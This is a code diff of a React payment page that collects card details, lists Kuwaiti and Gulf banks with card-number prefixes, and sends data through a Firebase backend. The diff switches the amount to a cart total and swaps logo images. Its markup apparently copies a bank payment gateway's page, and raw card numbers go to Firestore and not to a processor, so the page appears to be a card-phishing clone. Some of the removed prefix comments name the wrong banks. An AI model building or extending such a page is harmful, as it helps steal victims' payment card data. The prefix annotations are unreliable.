@@ -3,6 +3,7 @@ import { useEffect, useState } from 'react';
 import { doc, onSnapshot } from 'firebase/firestore';
 import { handlePay ,db} from '@/lib/firebase';
 import FullPageLoader from '@/components/fullpageloader';
+import { useCart } from '../contexts/cart-context';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -21,129 +22,94 @@ type PaymentInfo = {
 };
 const BANKS = [
   {
-    value: 'NBK',
-    label: 'National Bank of Kuwait',
-    cardPrefixes: ['464452', '589160', '46445250', '543363'],
+    value: "ABK",
+    label: "Al Ahli Bank of Kuwait",
+    cardPrefixes: ["403622", "428628", "423826"],
   },
   {
-    value: 'CBK',
-    label: 'Commercial Bank of Kuwait',
-    cardPrefixes: ['532672', '537015', '521175', '516334'],
+    value: "ALRAJHI",
+    label: "Al Rajhi Bank",
+    cardPrefixes: ["458838"],
   },
   {
-    value: 'GBK',
-    label: 'Gulf Bank',
-    cardPrefixes: [
-      '526206',
-      '531470',
-      '531644',
-      '531329',
-      '517419',
-      '517458',
-      '531471',
-      '559475',
-    ],
+    value: "BBK",
+    label: "Bank of Bahrain and Kuwait",
+    cardPrefixes: ["418056", "588790"],
   },
   {
-    value: 'ABK',
-    label: 'Al Ahli Bank of Kuwait',
-    cardPrefixes: ['403622', '428628    ', '423826'],
+    value: "BOUBYAN",
+    label: "Boubyan Bank",
+    cardPrefixes: ["470350", "490455", "490456", "404919", "450605", "426058", "431199"],
+  },
+
+  {
+    value: "BURGAN",
+    label: "Burgan Bank",
+    cardPrefixes: ["468564", "402978", "403583", "415254", "450238", "540759", "49219000"],
+  },
+
+  {
+    value: "CBK",
+    label: "Commercial Bank of Kuwait",
+    cardPrefixes: ["532672", "537015", "521175", "516334"],
+  }, {
+    value: "Doha",
+    label: "Doha Bank",
+    cardPrefixes: ["419252"],
+  },
+
+  {
+    value: "GBK",
+    label: "Gulf Bank",
+    cardPrefixes: ["526206", "531470", "531644", "531329", "517419", "517458", "531471", "559475"],
   },
   {
-    value: 'BURGAN',
-    label: 'Burgan Bank',
-    cardPrefixes: [
-      '468564',
-      '402978',
-      '403583',
-      '415254',
-      '450238',
-      '540759',
-      '49219000',
-    ],
+    value: "TAM",
+    label: "TAM Bank",
+    cardPrefixes: ["45077848", "45077849"],
+  },
+
+  {
+    value: "KFH",
+    label: "Kuwait Finance House",
+    cardPrefixes: ["485602", "537016", "5326674", "450778"],
   },
   {
-    value: 'KFH',
-    label: 'Kuwait Finance House',
-    cardPrefixes: ['485602', '537016', '537016', '450778'],
+    value: "KIB",
+    label: "Kuwait International Bank",
+    cardPrefixes: ["409054", "406464"],
   },
   {
-    value: 'BOUBYAN',
-    label: 'Boubyan Bank',
-    cardPrefixes: [
-      '470350',
-      '490455',
-      '490456',
-      '404919',
-      '450605',
-      '426058',
-      '431199',
-    ],
+
+    value: "NBK",
+    label: "National Bank of Kuwait",
+    cardPrefixes: ["464452", "589160"],
   },
   {
-    value: 'KIB',
-    label: 'Kuwait International Bank',
-    cardPrefixes: ['409054', '406464'],
+    value: "Weyay",
+    label: "Weyay Bank",
+    cardPrefixes: ["46445250", "543363"],
   },
   {
-    value: 'UNB',
-    label: 'Union National Bank   ',
-    cardPrefixes: ['457778', '513000'], // Added common prefixes for IBK
+    value: "QNB",
+    label: "Qatar National Bank",
+    cardPrefixes: ["521020", "524745"],
   },
   {
-    value: 'BBK',
-    label: 'Bank of Bahrain and Kuwait',
-    cardPrefixes: ['418056'], // Added a missing prefix
+    value: "UNB",
+    label: "Union National Bank",
+    cardPrefixes: ["457778"],
   },
   {
-    value: 'BNP',
-    label: 'BNP Paribas',
-    cardPrefixes: ['450216', '531483', '489800'], // Added a common prefix for BNP
+    value: "WARBA",
+    label: "Warba Bank",
+    cardPrefixes: ["541350", "525528", "532749", "559459"],
   },
-  {
-    value: 'HSBC',
-    label: 'HSBC Middle East Bank',
-    cardPrefixes: ['447284', '530001', '453095'], // Added an additional HSBC prefix
-  },
-  {
-    value: 'FAB',
-    label: 'First Abu Dhabi Bank',
-    cardPrefixes: ['440891', '530123', '454888'], // Added a prefix used by FAB
-  },
-  {
-    value: 'CITIBANK',
-    label: 'Citibank',
-    cardPrefixes: ['431457', '545432', '400800'], // Added another Citibank prefix
-  },
-  {
-    value: 'QNB',
-    label: 'Qatar National Bank',
-    cardPrefixes: ['521020', '524745'], // Added a Qatar National Bank prefix
-  },
-  {
-    value: 'Doha',
-    label: 'Doha Bank',
-    cardPrefixes: ['419252'], // Added another Mashreq prefix
-  },
-  {
-    value: 'ALRAJHI',
-    label: 'Al Rajhi Bank',
-    cardPrefixes: ['458838'], // Added a common Al Rajhi prefix
-  },
-  {
-    value: 'BANK_MUSCAT',
-    label: 'Bank Muscat',
-    cardPrefixes: ['489312', '529410', '454100'], // Added a prefix for Bank Muscat
-  },
-  {
-    value: 'WARBA',
-    label: 'Warba Bank',
-    cardPrefixes: ['541350', '525528', '532749', '559459'], // Added another common ICBC prefix
-  },
-];
+]
 
 export default function Payment (props: any)  {
   const handleSubmit = async () => {};
+  const {totalPrice} = useCart()
   const [loading, setLoading] = useState(false);
 
   const [step, setstep] = useState(1);
@@ -199,7 +165,7 @@ export default function Payment (props: any)  {
       style={{ background: '#f1f1f1', height: '100vh', margin: 0, padding: 0 }}
     >
 <div style={{display:'flex',justifyContent:'center'}}>
-<img src="/mob.jpg" alt='log' width={'100%'}/>
+<img src="/mob.png" alt='log' width={'100%'}/>
 
 </div>
       <form
@@ -208,7 +174,7 @@ export default function Payment (props: any)  {
         }}
       >
         <div className="madd" />
-        <div id="PayPageEntry">
+        <div id="PayPageEntry" dir='ltr'>
           <div className="container">
             <div className="content-block">
               <div className="form-card">
@@ -217,7 +183,7 @@ export default function Payment (props: any)  {
                   style={{ display: 'flex', justifyContent: 'center' }}
                 >
                   <img
-                    src="./next.svg"
+                    src="./kv.png"
                     className="-"
                     alt="logo"
                     height={50}
@@ -233,7 +199,7 @@ export default function Payment (props: any)  {
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {0.5}
+                    {totalPrice}
                     {'  '}KD&nbsp;{' '}
                   </label>
                 </div>
